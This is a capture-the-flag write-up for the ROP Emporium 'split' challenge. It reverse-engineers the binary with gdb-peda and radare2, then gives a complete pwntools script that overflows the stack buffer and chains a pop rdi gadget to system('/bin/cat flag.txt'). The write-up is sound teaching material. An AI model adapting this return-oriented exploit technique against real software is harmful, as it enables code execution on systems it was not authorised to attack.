1. `file split`

```bash
$ file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, 
BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped
```

2. gdb-peda, checksec

```bash
$ gdb-peda split
Reading symbols from split...
(No debugging symbols found in split)
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$
```

3. `r2 split`, `aa`, `afl`, I notice the special function **pwnme**, **usefulFunction**. 

```bash
[0x00400742]> afl
0x004005b0    1 42           entry0
0x004005f0    4 42   -> 37   sym.deregister_tm_clones
0x00400620    4 58   -> 55   sym.register_tm_clones
0x00400660    3 34   -> 29   sym.__do_global_dtors_aux
0x00400690    1 7            entry.init0
0x004006e8    1 90           sym.pwnme      ====> this one
0x00400580    1 6            sym.imp.memset
0x00400550    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.printf
0x00400590    1 6            sym.imp.read
0x00400742    1 17           sym.usefulFunction     ====> this one
0x00400560    1 6            sym.imp.system
0x004007d0    1 2            sym.__libc_csu_fini
0x004007d4    1 9            sym._fini
0x00400760    4 101          sym.__libc_csu_init
0x004005e0    1 2            sym._dl_relocate_static_pie
0x00400697    1 81           main             ====> this one
0x004005a0    1 6            sym.imp.setvbuf
0x00400528    3 23           sym._init
```

4. I choose to see the main function first. It seems do nothing but print some strings.

![Image](https://i.imgur.com/6wijIYI.png)

4. go to see another function **pwnme**. we have a input which store at **var_20h(rbp-0x20)**. 

![Image](https://i.imgur.com/nvN8Qsf.png)

5. and the usefulfunction is below.

![Image](https://i.imgur.com/NmfH83V.png)

6. we use `iz` to find an `cat / flag.txt`

```bash
[0x00400742]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt ===> this one
```

7. then we can write our expolit code.
    we need to padding to the return address, it is 0x20 + 0x8(rbp), then the address of `pop rdi ; ret`, then address of `/bin/cat flag.txt`, and `sym.imp.system`
```
from pwn import *

r = process('./split')
#r = remote('120.114.62.211', 6126)

padding = b'A'*40
pop_rdi = 0x4007c3
cat_flag = 0x601060
syscall = 0x400560

# payload = padding
# payload += p64(pop_rdi)
# payload += p64(cat_flag)
# payload += p64(syscall)

r.sendline(padding + p64(pop_rdi) + p64(cat_flag) + p64(syscall))  #if 64 bit ,or 32bit use p32

r.interactive()
```

8. then we can run the code and get the flag.

```bash
$ python3 exploit_split.py
[+] Starting local process './split': pid 155
[*] Switching to interactive mode
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
```